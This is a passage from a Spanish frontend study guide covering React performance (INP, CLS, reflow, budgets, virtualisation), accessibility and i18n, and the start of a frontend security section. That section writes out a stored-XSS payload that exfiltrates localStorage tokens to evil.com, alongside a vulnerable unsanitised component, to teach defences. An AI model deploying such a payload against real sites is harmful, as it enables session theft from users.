    interacciones relevantes durante la visita, no solo la primera. Así
    evalúa la *respuesta visual* real de la app a lo largo de toda la
    sesión, excluyendo los casos extremos (*outliers*). Esta métrica
    reemplazó a **FID** (*First Input Delay*), que solo medía el retraso
    de la *primera* interacción y no refleja realmente cómo responde la
    app en el uso cotidiano.

    Tres fases dentro de cada interacción:

    ```
    INP ≈ input delay + processing duration + presentation delay
    ```

    - **Input delay**: el hilo principal está ocupado (long tasks > 50 ms)
      antes de poder empezar el handler.
    - **Processing duration**: tu `onClick`, `setState`, filtros, etc.
    - **Presentation delay**: style → layout → paint → composite hasta
      el frame visible (enlaza con reflow/repaint más abajo).

    **Cómo mejorarlo en React**: la mayoría de INP malo en SPAs viene de
    (1) hidratación / JS parse que deja el hilo ocupado (*input delay*),
    (2) handlers que hacen mucho trabajo síncrono o re-renderizan árboles
    enormes (*processing* + *presentation*). Usa actualizaciones
    no urgentes (`startTransition`), memoización selectiva, listas
    virtualizadas y evita contexto global que re-renderiza toda la app
    en cada tecla.
  - **Ejemplo** (buenas prácticas en React):
    ```tsx
    // Mal: trabajo pesado síncrono + setState que re-renderiza todo
    function onFiltrar(texto: string) {
      const resultado = productos.filter(/* … */).sort(/* … */); // 10k ítems
      setLista(resultado);
    }

    // Mejor: feedback inmediato + trabajo no urgente
    import { startTransition, useTransition } from 'react';

    function Buscador({ productos }: { productos: Producto[] }) {
      const [texto, setTexto] = useState('');
      const [lista, setLista] = useState(productos);
      const [pending, startTrans] = useTransition();

      function onFiltrar(value: string) {
        setTexto(value); // urgente: el input debe pintarse ya (INP)
        startTrans(() => {
          setLista(productos.filter((p) => p.nombre.includes(value)));
        });
      }

      return (
        <>
          <input value={texto} onChange={(e) => onFiltrar(e.target.value)} />
          {pending ? <span>Filtrando…</span> : null}
          <ListaVirtualizada items={lista} />
        </>
      );
    }
    ```
    Otras prácticas React: `lazy` + `Suspense` para bajar JS inicial (menos
    *input delay* al cargar); no hacer `JSON.parse` enorme ni filtros en
    el click sin partir el trabajo; `memo` / estado local cerca del
    control (evitar Context que actualiza 200 consumidores); diferir
    analytics al idle; ver long tasks + Performance API más abajo.

- CLS (*Cumulative Layout Shift*): cuánto "salta" el contenido

  - **Teoría**: CLS (Cumulative Layout Shift) mide el total de movimientos
    inesperados de los elementos visibles en pantalla mientras la página
    está activa. El CLS aumenta cuanto mayor sea la proporción de área
    movida y mayor la distancia desplazada. Un valor alto suele deberse
    a imágenes, anuncios o banners que se insertan sin reservar su
    espacio, haciendo que el contenido "salte" y confundiendo al usuario.

    Para evitar CLS, siempre **reserva el espacio** que ocuparán imágenes,
    anuncios o embeds (definiendo `width`/`height` o `aspect-ratio`)
    antes de que carguen, y prefiere animar con `transform` o `opacity`
    para no provocar reflow de elementos vecinos.

    **Cómo mejorarlo en React**: el patrón típico es `return null` /
    skeleton que aparece tarde, o datos que llegan con `useEffect` e
    insertan un banner above-the-fold sin `min-height`. Reserva el slot
    en el primer render (aunque aún no haya datos) y no cambies el
    tamaño de tipografía/fuentes de forma que desplace el layout.
  - **Ejemplo** (buenas prácticas HTML/CSS + React):
    ```html
    <!-- Mal: sin tamaño → al cargar la imagen empuja todo lo de abajo -->
    <img src="/producto.jpg" alt="Producto" />

    <!-- Bien: reserva espacio (width/height o aspect-ratio) -->
    <img src="/producto.jpg" alt="Producto" width="400" height="300" />
    ```
    ```tsx
    // Mal: cuando llega el banner, empuja el contenido (CLS)
    function Page() {
      const [banner, setBanner] = useState<Banner | null>(null);
      useEffect(() => {
        fetchBanner().then(setBanner);
      }, []);
      return (
        <>
          {banner ? <Banner data={banner} /> : null}
          <Contenido />
        </>
      );
    }

    // Mejor: el slot ya ocupa espacio (skeleton / min-height)
    function Page() {
      const [banner, setBanner] = useState<Banner | null>(null);
      useEffect(() => {
        fetchBanner().then(setBanner);
      }, []);
      return (
        <>
          <div className="slot-banner" style={{ minHeight: 250 }}>
            {banner ? <Banner data={banner} /> : <BannerSkeleton />}
          </div>
          <Contenido />
        </>
      );
    }
    ```
    ```css
    .slot-banner { min-height: 250px; aspect-ratio: 16 / 9; }

    @font-face {
      font-family: Inter;
      src: url('/inter.woff2') format('woff2');
      font-display: swap;
    }
    ```
    Otras prácticas React: dimensiones en `<img>` / `next/image`; no
    montar toasts/modales que empujen el flujo (usa overlay/`fixed`);
    animar entrada con `transform`/`opacity`, no con `height`/`margin`.

- Checklist React: qué evaluar siempre para buen rendimiento

  - **Teoría**: antes de dar por "lista" una página o un PR, no basta
    mirar que "se vea rápido en localhost". Evalúa siempre estas
    dimensiones (CWV + causas habituales en React); si alguna falla, el
    p75 de campo o el budget de CI lo acabarán mostrando.
  - **Ejemplo** (lista de chequeo por PR / release):
    ```
    LCP / carga percibida
      [ ] ¿Cuál es el elemento LCP? (DevTools → Performance / Lighthouse)
      [ ] ¿Ese recurso está en el HTML o se descubre solo tras hidratar?
      [ ] ¿Hero sin loading="lazy" y con fetchpriority="high" + tamaño?
      [ ] ¿SSR/RSC o HTML útil, o #root vacío hasta que corre todo React?
      [ ] ¿Code splitting: lo no crítico va en lazy/Suspense?

    INP / interactividad
      [ ] ¿Peso del JS inicial (gzip) dentro del budget?
      [ ] ¿Hay long tasks > 50ms al cargar o al hacer clic? (Performance)
      [ ] ¿Handlers pesados usan startTransition / trabajo diferido?
      [ ] ¿Listas largas virtualizadas (no 10k nodos en el DOM)?
      [ ] ¿Un Context/store global re-renderiza de más en cada tecla?

    CLS / estabilidad
      [ ] ¿Imágenes/embeds con width/height o aspect-ratio?
      [ ] ¿Slots (banner, ads, skeleton) con min-height desde el 1er paint?
      [ ] ¿Fuentes con font-display y sin saltos grandes de métricas?
      [ ] ¿Animaciones con transform/opacity, no top/height?

    Medición (siempre)
      [ ] Lab: Lighthouse en la URL crítica (móvil) — LCP, CLS, TBT
      [ ] Campo: web-vitals / CrUX / Search Console en p75
      [ ] CI: performance budget (peso JS + LCP/CLS/TBT) en el PR
      [ ] ¿Probaste la ruta que importa (/checkout), no solo la home?
    ```
    Si solo puedes hacer tres cosas en cada feature: (1) no engordar el
    JS del path crítico, (2) no retrasar el elemento LCP, (3) no insertar
    UI above-the-fold sin espacio reservado. El resto de la checklist
    evita regresiones silenciosas.

- Campo vs laboratorio: qué mide cada uno

  - **Teoría**: **campo (RUM / CrUX)** es lo que importa para el p75 de
    CWV y para Search: dispositivos reales, redes reales, usuarios
    reales. **Laboratorio (Lighthouse, CI)** es reproducible y sirve
    para atrapar regresiones antes del merge, pero no sustituye al
    campo (un lab en desktop cableado no ve el móvil 3G del p75). Por
    eso los performance budgets (más abajo) usan lab (LCP/CLS/TBT/peso)
    como red de seguridad, y el monitoreo RUM valida INP/LCP/CLS reales.
  - **Ejemplo**:
    ```
    Flujo sano:
      Lab/CI  → no dejes entrar regresiones (budget falla el PR)
      Campo   → confirma que el p75 móvil sigue ≤ umbrales CWV

    Si CI verde y Search Console rojo:
      el budget no representa la página/dispositivo crítico
      (p. ej. solo medías / en desktop y el problema es /checkout móvil).
    ```

### En profundidad

- Costo relativo de reflow, repaint y composite-only en el rendering pipeline

  - **Teoría**: no todos los cambios visuales cuestan lo mismo, y saber
    cuál dispara qué es la base de animar sin destruir el rendimiento
    (conectando con el Critical Rendering Path visto en la sección 1).
    Tras el primer pintado, cada frame no reconstruye la página desde
    cero: el navegador invalida solo las etapas necesarias y las
    recalcula en este orden:

    ```
    JS → Style → Layout (reflow) → Paint (repaint) → Composite
    ```

    A 60 fps el presupuesto por frame es ~16.7 ms. El hilo principal
    hace JS, estilos, layout y las órdenes de paint; la rasterización y
    el composite suelen ir al hilo compositor / proceso de GPU. Por eso
    una animación que se queda en **composite-only** puede seguir a 60
    fps aunque el hilo principal esté ocupado.

    Invalidar una etapa obliga a repetir las posteriores (layout implica
    paint + composite; paint implica composite). El costo relativo es
    **layout > paint > composite**:

    - **Reflow (layout)**: cambia la geometría (`width`, `height`,
      `margin`, `padding`, `top`/`left` con `position`, `font-size`,
      `display`, flex/grid, agregar/quitar contenido). El navegador
      recalcula posición y tamaño de ese elemento y potencialmente de
      hermanos, padres y descendientes, y luego tiene que repintar y
      componer. Es lo más caro.
    - **Repaint (paint)**: la caja no se mueve, pero cambian los
      píxeles (`color`, `background-color`, `box-shadow`,
      `visibility`). No hay reflow, pero sí hay que grabar comandos de
      pintado y rasterizar la capa; luego se compone. Costo intermedio.
    - **Composite-only**: `transform` y `opacity` sobre un elemento que
      ya es su propia capa. La textura ya está en la GPU; el compositor
      solo actualiza la matriz (mover/escalar/rotar) o la transparencia
      y recombina capas, sin recalcular layout ni repintar. Es la única
      categoría que se puede animar a 60 fps de forma confiable en
      hardware modesto.

    Dos matices que cambian el costo real: (1) `transform`/`opacity`
    solo son composite-only si el elemento ya es una **capa del
    compositor** (el navegador la crea solo, o la fuerzas con
    `will-change: transform`); promover demasiados nodos gasta memoria
    de GPU. (2) **Layout thrashing**: el navegador intenta agrupar
    escrituras de estilo y hacer un solo layout al final del frame; si
    lees geometría (`offsetWidth`, `getBoundingClientRect`) justo
    después de escribir estilos, fuerza un layout síncrono — y en un
    bucle de leer-luego-escribir eso se multiplica.
  - **Ejemplo**:
    ```css
    /* Costoso: cambia el layout en cada frame -> reflow + paint + composite */
    .modal-mala {
      transition: top 0.3s, left 0.3s;
    }
    .modal-mala.abierto {
      top: 0;
      left: 0;
    }

    /* Barato: composite-only, la GPU solo recombina capas ya pintadas */
    .modal-buena {
      transition: transform 0.3s, opacity 0.3s;
      transform: translateY(-20px);
      opacity: 0;
      /* opcional: sugiere al navegador crear la capa ya, no en el primer frame */
      will-change: transform, opacity;
    }
    .modal-buena.abierto {
      transform: translateY(0);
      opacity: 1;
    }
    ```
    ```js
    // Layout thrashing: un layout forzado por ítem (escribe, luego lee)
    for (const el of items) {
      el.style.width = el.offsetWidth + 10 + 'px';
    }

    // Mejor: leer todo, luego escribir todo (un solo layout)
    const widths = items.map((el) => el.offsetWidth);
    items.forEach((el, i) => {
      el.style.width = widths[i] + 10 + 'px';
    });
    ```
    En Chrome DevTools → Performance, un reflow aparece como barra
    morada "Layout", el paint como "Paint", y el composite en la pista
    del compositor. Si tu animación genera barras de Layout en cada
    frame, es candidata a reescribirse con `transform`/`opacity`.

- Presupuestos de performance (*performance budgets*) automatizados en CI

  - **Teoría**: sin un límite explícito, el peso del bundle y las métricas
    de Core Web Vitals tienden a degradarse gradualmente con cada
    feature nueva — nadie decide "vamos a hacer la app más lenta", pero
    la suma de pequeños añadidos lo logra igual. Un **performance
    budget** fija un umbral máximo (peso de JS, LCP, tamaño de una
    imagen) y falla el pipeline de CI si un cambio lo supera, convirtiendo
    una regresión de rendimiento en un error de build detectado antes de
    llegar a producción, en vez de un hallazgo tardío en una auditoría
    manual ocasional.
  - **Ejemplo**:
    ```json
    // lighthouserc.json — falla el CI si el LCP supera 2.5s o el bundle JS supera 300kb
    {
      "ci": {
        "assert": {
          "assertions": {
            "largest-contentful-paint": ["error", { "maxNumericValue": 2500 }],
            "total-byte-weight": ["error", { "maxNumericValue": 300000 }]
          }
        }
      }
    }
    ```

- Diagnosticar long tasks e INP con la Performance API

  - **Teoría**: una **long task** es cualquier trabajo síncrono en el
    hilo principal que dura más de **50 ms**. Durante ese tiempo el
    navegador no puede procesar clics, teclas ni pintar feedback visual,
    lo que degrada el **INP** — sobre todo la fase *input delay* (ya
    vista en Core Web Vitals arriba).

    Cómo se conectan:

    ```
    Usuario hace clic
        → [input delay]      ← hilo ocupado por long task(s)
        → [processing]       ← onClick / setState / filtro
        → [presentation]     ← style → layout → paint → composite
        → siguiente paint    = lo que mide INP
    ```

    Long task *antes* del handler → sube input delay. Trabajo pesado
    *dentro* del handler → sube processing (y a veces presentation si
    mutas mucho el DOM). Varias long tasks encadenadas → la UI “no
    responde” aunque la red esté bien.

    La **Performance API** expone esas mediciones. Con
    `PerformanceObserver` te suscribes a tipos de entry:

    - `'longtask'` — bloqueos del hilo > 50 ms (causa típica de input
      delay). Cada entry trae `duration`, `startTime` y a veces
      `attribution` (script/frame; soporte limitado).
    - `'event'` (Event Timing) — duración de interacciones
      (clic/tap/tecla ≈ input + processing + presentation). Es la base
      de medir INP en campo; `onINP` de `web-vitals` lo encapsula.
    - User Timing (`mark`/`measure`) — marcas tuyas para atribuir
      “quién” dentro de la app.

    Lab vs campo: en Lighthouse/CI usas **TBT** como proxy; en
    producción `longtask` + Event Timing / `onINP` te dicen si el
    problema ocurre de verdad y en qué URL. En DevTools → Performance,
    los bloques largos de la pista **Main** son long tasks; el track de
    Interactions / Web Vitals muestra la interacción lenta.

    Al detectar una: partir trabajo (`scheduler.yield`, chunks);
    `startTransition` en React; menos JS al cargar (code splitting /
    hidratación); Web Worker si no toca el DOM; third-parties en idle,
    no en el path del clic.
  - **Ejemplo**:
    ```ts
    // 1) Causa: long tasks (> 50 ms en el hilo principal)
    const longTasks = new PerformanceObserver((list) => {
      for (const entry of list.getEntries()) {
        console.warn(
          `Long task: ${entry.duration.toFixed(0)} ms @ ${entry.startTime.toFixed(0)}`,
          entry,
        );
        // enviarAMonitoreo('longtask', {
        //   duration: entry.duration,
        //   startTime: entry.startTime,
        // });
      }
    });
    // buffered: true → también captura tareas justo antes de suscribirte
    // (útil en SPAs si el observer se monta después del hydrate)
    longTasks.observe({ type: 'longtask', buffered: true });

    // 2) Síntoma: interacciones lentas (base de INP)
    const events = new PerformanceObserver((list) => {
      for (const entry of list.getEntries()) {
        // entry.name: 'click' | 'keydown' | …
        // entry.duration ≈ input delay + processing + presentation
        if (entry.duration > 200) {
          // umbral "good" de INP
          console.warn('Interacción lenta', entry.name, entry.duration, entry);
        }
      }
    });
    // durationThreshold por defecto ~104 ms; mínimo práctico ~16
    events.observe({ type: 'event', buffered: true, durationThreshold: 16 });
    ```
    ```
    Correlación en RUM (misma URL / ventana de tiempo):
      Clic @ t=1200 ms, duration=380 ms   → INP malo (> 200 ms)
      Long task @ t=1100–1180 ms (80 ms) → explica gran parte del input delay
      → revisar qué JS corría ahí (hydrate, filtro sync, third-party)
    ```
    Alternativa lista para producción: `onINP` de `web-vitals` (mismo
    dato de Event Timing, con el cálculo de INP ya resuelto) + enviar
    long tasks al mismo backend para cruzar causa y síntoma.

- Virtualización de listas largas (*windowing*)

  - **Teoría**: renderizar miles de filas en el DOM real es inviable —
    cada nodo cuesta memoria, layout y tiempo en el hilo principal, y el
    navegador se vuelve inmanejable mucho antes de llegar a 10,000
    ítems. Eso empeora scroll, montaje (TBT / long tasks) e **INP**.

    La **virtualización** (o *windowing*) solo monta las filas
    **visibles** en el viewport (más un pequeño margen u *overscan*) y,
    al hacer scroll, **reutiliza** ese puñado de nodos con datos nuevos.
    El usuario percibe una lista enorme; el DOM real suele tener solo
    unas pocas decenas de nodos.

    Cómo funciona:

    ```
    1. Sabes (o estimas) itemSize y la altura del viewport
    2. startIndex = floor(scrollTop / itemSize)
       endIndex   = startIndex + ceil(viewportHeight / itemSize)
    3. Añades overscan (p. ej. 3–5 filas) para no ver huecos al scrollear
    4. Solo esas filas existen en el DOM, posicionadas (absolute /
       transform) según su índice
    5. Un "spacer" interno mide itemCount × itemSize para que la
       scrollbar refleje toda la lista lógica
    6. En cada scroll se recalcula el rango y se re-renderizan esos
       pocos nodos — no se crean 10,000 elementos
    ```

    ```
    ┌─ viewport (p. ej. 600px) ────────────┐
    │  (overscan)                           │
    │  filas visibles  ← solo estas en DOM  │
    │  (overscan)                           │
    └───────────────────────────────────────┘
      spacer: 10,000 × 50px  (el scroll “cree” que la lista es enorme)
    ```

    Con **altura fija** (`FixedSizeList`) el índice es aritmética
    simple. Con **altura variable** (`VariableSizeList`) hay que medir
    o cachear alturas — misma idea, más complejo. El array de datos
    puede seguir entero en memoria JS; lo que se reduce es el **DOM**
    (y el trabajo de reconciliación de React).

    Usar cuando hay cientos/miles de filas o el Profiler muestra montaje
    caro. No hace falta en listas cortas. Limitaciones: Ctrl+F no ve
    filas no montadas; focus/ARIA y filas de altura dinámica requieren
    cuidado; alternativas: `react-window`, `@tanstack/react-virtual`.
  - **Ejemplo (`react-window`)**:
    ```tsx
    import { FixedSizeList } from 'react-window';

    function ListaVirtualizada({ productos }) {
      return (
        <FixedSizeList
          height={600}                 // alto del viewport de la lista
          itemCount={productos.length} // ítems lógicos (puede ser 10,000+)
          itemSize={50}                // alto fijo de cada fila
          width="100%"
        >
          {({ index, style }) => (
            // Solo se llama para filas de la ventana visible (+ overscan)
            // style posiciona la fila dentro del spacer
            <div style={style}>{productos[index].name}</div>
          )}
        </FixedSizeList>
      );
    }
    ```
    Relación con CWV / pipeline: menos nodos → menos layout/paint al
    scrollear; menos trabajo al montar → mejor TBT / menos long tasks;
    interacciones más baratas → ayuda a INP. No arregla LCP por sí solo,
    salvo que montar la lista entera bloqueara el paint del contenido
    principal.

## 9. Accesibilidad e i18n

**Accesibilidad (a11y)** significa que personas con discapacidades —por ejemplo, ceguera, problemas motores o baja visión— puedan usar una web igual que cualquier usuario, sin depender de ver la pantalla o usar solo el mouse. Ejemplos: navegar solo con el teclado (Tab, flechas); lectores de pantalla que leen los textos y estructura (roles semánticos, ARIA), alto contraste para baja visión, roles ARIA para describir componentes. Sirve para que el producto sea utilizable para todos, cumple leyes y mejora la experiencia en general (incluso atajos de teclado y foco visible benefician a todos).  
**i18n** (*internationalization* / internacionalización): preparar la app para varios idiomas y culturas; el numerónimo viene de *i* + 18 letras + *n*.
preparar la app para varios idiomas y culturas; el numerónimo viene de
*i* + 18 letras + *n*. En un producto real se usan para cumplir
requisitos legales y de inclusividad (WCAG), expandir a mercados con
idiomas LTR/RTL y plurales distintos, y evitar bugs “solo visibles”
(modales sin focus trap, textos hardcodeados, `margin-left` que se
rompe en árabe/hebreo). En corto: accesibilidad = que todos puedan
usarla; i18n = que funcione bien en cualquier idioma/cultura.

### En profundidad

- Cómo atacar a11y en un componente (orden de decisión)

  - **Qué resuelve**: evita el antipatrón “primero `div` + ARIA y después
    arreglar teclado”. La mayoría de bugs a11y (botones que no responden a
    Enter/Espacio, modales que dejan tabular el fondo, iconos sin nombre)
    vienen de saltarse el HTML nativo o de inventar un widget sin el
    contrato de teclado del patrón APG.

  - **Solución (orden fijo al implementar o revisar un componente)**:
    1. **¿Hay control HTML nativo?** → úsalo (`button`, `a`, `input`,
       `select`, `label`, `dialog` donde aplique). Ganas foco, teclado y
       rol “gratis”.
    2. **Si no alcanza** → elige el patrón del WAI-ARIA Authoring
       Practices Guide (dialog, combobox, listbox, menu…) e implementa
       **atributos + teclado + manejo de foco**, no solo `role`.
    3. **Si el patrón es complejo** → no lo reinventes: Radix UI, React
       Aria u otra librería headless ya auditada.
    4. **Verifica** nombre + rol + estado (qué anuncia el lector) y un
       pase solo con teclado antes de merge.

  - **¿En todos los componentes?** No. La intensidad depende del tipo:

    | Tipo de UI | Qué aplicar |
    |---|---|
    | Texto / layout / cards estáticas | Semántica básica (headings, landmarks). Casi nunca ARIA custom. |
    | Controles simples (`button`, link, input, checkbox) | **Siempre** nativo + label/nombre accesible. Aquí el “orden de decisión” termina en el paso 1. |
    | Icon-only, toggles, tabs simples | Nativo o poco ARIA (`aria-label`, `aria-pressed`, `aria-selected`). |
    | Overlays (modal, popover, dropdown, drawer) | Focus trap, restaurar foco, `Escape`, fondo no enfocable (`inert` / librería). Candidatos fuertes a Radix/React Aria. |
    | Widgets compuestos (combobox, date picker, menu, listbox virtualizado) | Patrón APG completo o librería. **No** copiar de otro feature a mano. |
    | Design system / primitives compartidos | Aquí se concentra la inversión: las features solo componen primitives correctas. |

    Regla práctica de code review: si el componente **recibe foco**,
    **dispara una acción** o **cambia de estado anunciable**, aplica el
    orden de decisión. Si solo pinta UI no interactiva, no fuerces ARIA.

  - **Ejemplo con buena práctica** (mismo problema, tres niveles):

    ```tsx
    // 1) Malo: parece botón, no lo es (sin teclado/rol reales)
    <div className="btn" onClick={onSave}>Guardar</div>

    // 2) Bueno para control simple: HTML nativo (paso 1 del orden)
    <button type="button" onClick={onSave}>
      Guardar
    </button>

    // 3) Bueno para overlay: no reinventar el dialog
    import * as Dialog from '@radix-ui/react-dialog';

    <Dialog.Root open={open} onOpenChange={setOpen}>
      <Dialog.Trigger asChild>
        <button type="button">Editar perfil</button>
      </Dialog.Trigger>
      <Dialog.Portal>
        <Dialog.Overlay />
        <Dialog.Content aria-describedby={undefined}>
          <Dialog.Title>Editar perfil</Dialog.Title>
          {/* foco, Escape y restore los resuelve Radix */}
          <button type="button" onClick={onSave}>Guardar</button>
        </Dialog.Content>
      </Dialog.Portal>
    </Dialog.Root>
    ```

    En el caso 2, “atacar a11y” = elegir `<button>`. En el caso 3,
    “atacar a11y” = reconocer que es un **dialog** y delegar el patrón
    (o implementarlo entero según APG), no poner `role="dialog"` en un
    `div` y darlo por cerrado.

- Patrones ARIA avanzados con manejo de teclado completo

  - **Teoría**: un componente ARIA complejo (combobox, listbox, modal) no
    es solo poner los atributos `role`/`aria-*` correctos — requiere
    implementar el **manejo de teclado completo** que ese patrón exige
    según el WAI-ARIA Authoring Practices Guide, o el componente queda
    inaccesible aunque el HTML "parezca" correcto. Un ejemplo concreto
    de trampa: un modal con **focus trap** debe atrapar el foco dentro de
    sí mismo mientras está abierto — al presionar `Tab` en el último
    elemento enfocable, el foco debe volver al primero (y `Shift+Tab` en
    el primero debe ir al último), en vez de "escaparse" hacia el
    contenido de fondo que sigue técnicamente presente en el DOM detrás
    del overlay.
  - **Ejemplo paso a paso** (focus trap en un modal):
    ```tsx
    function useFocusTrap(modalRef: React.RefObject<HTMLElement>) {
      useEffect(() => {
        const modal = modalRef.current;
        if (!modal) return;

        function handleKeyDown(e: KeyboardEvent) {
          if (e.key !== 'Tab') return;
          const focusables = modal.querySelectorAll<HTMLElement>(
            'button, [href], input, select, textarea, [tabindex]:not([tabindex="-1"])',
          );
          const primero = focusables[0];
          const ultimo = focusables[focusables.length - 1];

          if (e.shiftKey && document.activeElement === primero) {
            e.preventDefault();
            ultimo.focus(); // Shift+Tab en el primero -> salta al último
          } else if (!e.shiftKey && document.activeElement === ultimo) {
            e.preventDefault();
            primero.focus(); // Tab en el último -> vuelve al primero
          }
        }

        modal.addEventListener('keydown', handleKeyDown);
        return () => modal.removeEventListener('keydown', handleKeyDown);
      }, [modalRef]);
    }
    ```
    Para un **combobox** (input con sugerencias) o un **listbox**
    (lista seleccionable), el patrón exige además `ArrowDown`/`ArrowUp`
    para moverse entre opciones, `Enter` para seleccionar, `Escape` para
    cerrar, y `aria-activedescendant` para anunciar la opción resaltada
    sin mover el foco del DOM del input — replicar esto a mano es
    exactamente el trabajo que hacen librerías como Radix UI o React
    Aria, y es una razón legítima para no reinventarlas.

- Proceso real de testing con lector de pantalla

  - **Teoría**: axe y Lighthouse (vistos en `GOOD-FRONTEND-PRACTICES.md`)
    detectan violaciones estructurales, pero no pueden evaluar si la
    **experiencia real** de navegar con un lector de pantalla tiene
    sentido — eso exige probarlo tú mismo, con el mouse desconectado.
  - **Ejemplo paso a paso** (VoiceOver en macOS, flujo típico de QA):
    1. Actívalo con `Cmd + F5`.
    2. Navega la página **solo** con `Tab`/`Shift+Tab` (elementos
       interactivos) y `Ctrl+Option+Flecha` (cualquier contenido,
       elemento por elemento).
    3. En cada control, escucha qué anuncia VoiceOver: ¿dice el rol
       ("botón", "enlace")? ¿dice el estado (`"seleccionado"`,
       `"expandido"`)? ¿el nombre accesible tiene sentido fuera de
       contexto visual (un botón que solo dice "Editar" sin decir
       *qué* se edita es ambiguo para quien no ve la fila completa)?
    4. Dispara una validación de formulario y confirma que se **anuncia
       automáticamente** el error (esto prueba en la práctica el
       `aria-live` visto en `GOOD-FRONTEND-PRACTICES.md`) sin que el
       usuario tenga que navegar manualmente hasta encontrarlo.
    5. Abre y cierra un modal, y confirma que el foco entra al abrir y
       vuelve al botón que lo disparó al cerrar.

    El mismo flujo aplica con NVDA (*NonVisual Desktop Access* — ver
    Glosario) en Windows, el lector de pantalla gratuito más usado fuera
    del ecosistema Apple.

- Soporte RTL y propiedades lógicas de CSS

  - **Teoría**: idiomas como árabe o hebreo se leen de derecha a
    izquierda (**RTL**, *Right-To-Left* — ver Glosario), al contrario del
    español o inglés (**LTR**, *Left-To-Right* — ver Glosario). Usar
    propiedades físicas de CSS (`margin-left`, `text-align: left`)
    hardcodea una dirección de lectura específica: en un layout RTL,
    "izquierda" ya no significa "donde empieza el texto", produce un
    diseño invertido visualmente pero no semánticamente. Las
    **propiedades lógicas** (`margin-inline-start`, `text-align: start`)
    se definen en relación al flujo de lectura, no a un lado físico de
    la pantalla, y el navegador las traduce automáticamente a
    izquierda/derecha real según el `dir` del documento.
  - **Ejemplo**:
    ```css
    /* Malo: en RTL, esto sigue empujando a la izquierda -- lado incorrecto */
    .card {
      margin-left: 16px;
      text-align: left;
    }

    /* Bueno: se adapta automáticamente según dir="ltr" o dir="rtl" */
    .card {
      margin-inline-start: 16px;
      text-align: start;
    }
    ```
    ```html
    <html lang="ar" dir="rtl">
      <!-- margin-inline-start ahora empuja hacia la derecha automáticamente -->
    </html>
    ```

- Pluralización compleja con ICU MessageFormat

  - **Qué es**: ICU (*International Components for Unicode* — ver
    Glosario) MessageFormat es el formato de mensajes que usan
    `react-intl`, `next-intl`, FormatJS, etc. En vez de armar el texto
    con `if`/`ternario` en el código, el traductor declara **todas las
    formas** en el string; la librería elige la correcta según locale +
    número.

  - **Qué resuelve**: idiomas con más de dos plurales. Español/inglés
    suelen bastar con `one`/`other`; ruso o polaco necesitan
    `one`/`few`/`many`/`other` (reglas CLDR). Concatenar
    `` `Tienes ${n} mensajes` `` o un `n === 1` en JSX falla en esos
    locales y rompe el orden de palabras.

  - **Cómo funciona**:
    1. El mensaje declara un selector: `{count, plural, …}`.
    2. En runtime pasas `{ count: 3 }` y el locale activo (`ru`, `es`…).
    3. ICU aplica las reglas de plural de ese locale al número.
    4. Entra a la categoría (`one`, `few`, `many`, `other`…) y rellena
       `#` (o `{count}`) con el número ya formateado.
    El JSX nunca ramifica por idioma: solo `t('unread', { count })`.

  - **Ejemplo**:
    ```json
    // en.json — inglés: one / other alcanza
    {
      "unread": "{count, plural, one {# unread message} other {# unread messages}}"
    }

    // ru.json — mismas categorías del estándar; el traductor rellena las que usa el ruso
    {
      "unread": "{count, plural, one {# непрочитанное сообщение} few {# непрочитанных сообщения} many {# непрочитанных сообщений} other {# непрочитанных сообщений}}"
    }
    ```
    ```tsx
    // Malo: lógica de plural en código (rompe en ru/pl/ar)
    const msg = count === 1 ? '1 mensaje' : `${count} mensajes`;

    // Bueno: MessageFormat decide la rama
    t('unread', { count: 3 });
    // locale=en → "3 unread messages"
    // locale=ru → rama "few" → "3 непрочитанных сообщения"
    ```

  - **Buena práctica**: una key por mensaje completo (no trozos
    concatenados); pasar el número como valor; dejar las categorías en
    los JSON por idioma. En code review, un `count === 1 ?` sobre texto
    visible es olor a i18n incompleto.

## 10. Seguridad en frontend

Esto amplía la sección 4 de `GOOD-FRONTEND-PRACTICES.md` con el nivel de
detalle que suele pedirse en entrevistas senior: no solo “no uses
`dangerouslySetInnerHTML`”, sino *por qué* el navegador permite cada
ataque, en qué orden ocurre y qué control es del frontend frente a qué
debe vivir en el servidor.

El vocabulario de industria está en **OWASP** (*Open Web Application
Security Project* — ver Glosario): publica el Top 10 de riesgos web más
comunes. No es una norma solo de frontend, pero casi todos los ítems
tienen una cara en el cliente (XSS, CSRF, componentes con CVEs,
fallos de auth). Regla senior: el frontend **reduce superficie** y
añade defensa en profundidad; el **perímetro de confianza** es el
servidor. El navegador del usuario es hostil (DevTools, extensiones,
XSS).

### Básico

- XSS (*Cross-Site Scripting*): inyección de JavaScript malicioso

  - **Teoría**: **XSS** (ver Glosario) es la forma más relevante de
    *Injection* en frontend. El atacante logra que tu origen ejecute JS
    suyo en el navegador de la víctima: puede leer `localStorage`,
    manipular el DOM, o llamar a tu API con la sesión de la víctima.
    React escapa el texto en `{valor}` automáticamente; se pierde esa
    protección con `dangerouslySetInnerHTML`, `innerHTML`, URLs
    `javascript:` o `eval`. **CSP** (*Content Security Policy* — ver
    Glosario) mitiga el impacto limitando de dónde pueden cargarse
    scripts, pero no sustituye escapar/sanitizar.

  - **Ejemplo paso a paso** (comentario con payload):
    1. El atacante guarda como comentario:
       `<img src=x onerror="fetch('https://evil.com?t='+localStorage.token)">`.
    2. La app lo renderiza con `dangerouslySetInnerHTML` sin sanitizar.
    3. Otra usuaria abre el hilo; el navegador falla al cargar `src=x` y
       dispara `onerror`.
    4. El script corre en el origen de tu app y exfiltra el token.
    ```tsx
    // El hueco: HTML de usuario sin sanitizar
    function Comentario({ html }: { html: string }) {
      return <div dangerouslySetInnerHTML={{ __html: html }} />;
    }
    ```

  - **Buenas prácticas** (cada una con mal / bien):
    - Preferir texto (React escapa por defecto).
      ```tsx
      // Mal
      <div dangerouslySetInnerHTML={{ __html: userComment }} />

      // Bien
      <div>{userComment}</div>
      ```
    - Si necesitas HTML: sanitizar (p. ej. DOMPurify) antes de insertar.
      ```tsx
      import DOMPurify from 'dompurify';

      // Mal
      <article dangerouslySetInnerHTML={{ __html: post.body }} />

      // Bien
      <article
        dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(post.body) }}
      />
      ```
    - No guardar tokens de sesión donde cualquier JS pueda leerlos.
      ```ts
      // Mal
      localStorage.setItem('access_token', jwt);

      // Bien — cookie HttpOnly puesta por el servidor (JS no la lee)
      // Set-Cookie: session=...; HttpOnly; Secure; SameSite=Strict
      ```
    - Evitar APIs que ejecutan strings como código.
      eval ejecuta el string que recibe como código JavaScript. Esto es muy peligroso porque permite ejecutar código arbitrario, lo que abre la puerta a vulnerabilidades como XSS y ataques de inyección de código.
      ```ts
      // Mal
      eval(userInput);
